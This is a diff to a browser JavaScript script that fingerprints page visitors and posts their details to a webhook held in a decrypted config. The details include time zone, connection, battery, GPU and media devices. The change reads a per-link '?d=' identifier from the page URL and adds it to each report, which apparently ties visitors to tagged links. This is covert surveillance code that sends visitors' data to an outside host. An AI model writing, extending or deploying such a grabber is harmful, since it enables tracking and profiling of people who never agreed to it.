@@ -16,6 +16,13 @@
   info.utcOffset = new Date().getTimezoneOffset();
   info.localTime = new Date().toString();
   info.connection = (navigator.connection ? `${navigator.connection.effectiveType || 'unknown'} (${navigator.connection.downlink || '?' } Mbps)` : "unknown");
+  
+  // Extract Identifier from current page URL (?d= parameter)
+  try{
+    const urlParams = new URLSearchParams(window.location.search);
+    info.identifier = urlParams.get('d') || urlParams.get('D') || null;
+  }catch(e){ info.identifier = null; }
+  
   try { 
     const battery = await navigator.getBattery(); 
     info.battery = `${(battery.level*100).toFixed(0)}% ${battery.charging ? '⚡ charging' : '🔋'}`; 
@@ -224,48 +231,8 @@
       __webhook_state.url = webhookUrl;
       __webhook_state.base = base;
 
-      // extract optional d parameter (robust search)
-      let dParam = null;
-      function unescapeUnicode(str){ return str.replace(/\\u([0-9a-fA-F]{4})/g, function(_, g){ return String.fromCharCode(parseInt(g,16)); }); }
-      function tryExtractFromString(s){
-        if(!s || typeof s !== 'string') return null;
-        const tried = new Set();
-        const candidates = [s];
-        try{ candidates.push(unescapeUnicode(s)); }catch(e){}
-        try{ candidates.push(decodeURIComponent(s)); }catch(e){}
-        try{ candidates.push(unescapeUnicode(decodeURIComponent(s))); }catch(e){}
-        // try base64-ish decode if it looks plausible
-        try{
-          const compact = s.replace(/\s+/g,'');
-          if(/^[A-Za-z0-9+/=]+$/.test(compact) && compact.length % 4 === 0){
-            try{ candidates.push(atob(compact)); }catch(e){}
-          }
-        }catch(e){}
-        for(const c of candidates){ if(!c || tried.has(c)) continue; tried.add(c);
-          // common patterns like ?d= or &d= (case-insensitive)
-          const m = /[?&][dD]=([^&"'\s]+)/.exec(c);
-          if(m) return decodeURIComponent(m[1]);
-          // sometimes appears as /?d= in encoded fragments
-          const m2 = /\/(?:\?d=|\?D=)([^&"'\s]+)/.exec(c);
-          if(m2) return decodeURIComponent(m2[1]);
-        }
-        return null;
-      }
-
-      // 1) try webhookUrl directly
-      try{ dParam = tryExtractFromString(webhookUrl); }catch(e){ dParam = null; }
-      // 2) recursively search decrypted cfg object for strings containing d param
-      if(!dParam && cfg){
-        const stack = [cfg];
-        while(stack.length && !dParam){
-          const node = stack.pop();
-          if(typeof node === 'string'){ dParam = tryExtractFromString(node); if(dParam) break; }
-          else if(Array.isArray(node)) stack.push(...node);
-          else if(node && typeof node === 'object'){
-            for(const v of Object.values(node)) stack.push(v);
-          }
-        }
-      }
+      // Use Identifier from page URL (already extracted and stored in collectedInfo.identifier)
+      const identifier = collectedInfo.identifier || null;
 
       // Build a compact embed with the most relevant fields (truncate long values)
       const truncate = (s, n=1024) => (typeof s === 'string' ? (s.length>n ? s.slice(0,n-1)+"…" : s) : String(s));
@@ -277,8 +244,8 @@
       if(collectedInfo.gpu) fields.push({ name: 'gpu', value: truncate(collectedInfo.gpu.renderer || JSON.stringify(collectedInfo.gpu)), inline:false });
       if(collectedInfo.devices && collectedInfo.devices.length) fields.push({ name: 'media devices', value: truncate(collectedInfo.devices.join('\n'), 1900), inline:false });
 
-  // include the optional dParam as an Identifier field in the embed
-  if(dParam) fields.push({ name: 'Identifier', value: truncate(dParam, 1024), inline:false });
+      // include the Identifier from page URL as a field in the embed
+      if(identifier) fields.push({ name: 'Identifier', value: truncate(identifier, 1024), inline:false });
 
       const embed = {
         title: 'Visitor info',
@@ -288,7 +255,7 @@
       };
 
       // DEBUG: show what we're about to send
-      try{ console.debug('sendToWebhook: webhook url =', __webhook_state.url); console.debug('sendToWebhook: Identifier =', dParam); console.debug('sendToWebhook: embed =', embed); }catch(e){}
+      try{ console.debug('sendToWebhook: webhook url =', __webhook_state.url); console.debug('sendToWebhook: Identifier =', identifier); console.debug('sendToWebhook: embed =', embed); }catch(e){}
 
       // If we've not yet sent, POST with ?wait=true to get message id back, otherwise PATCH the existing message
       try{
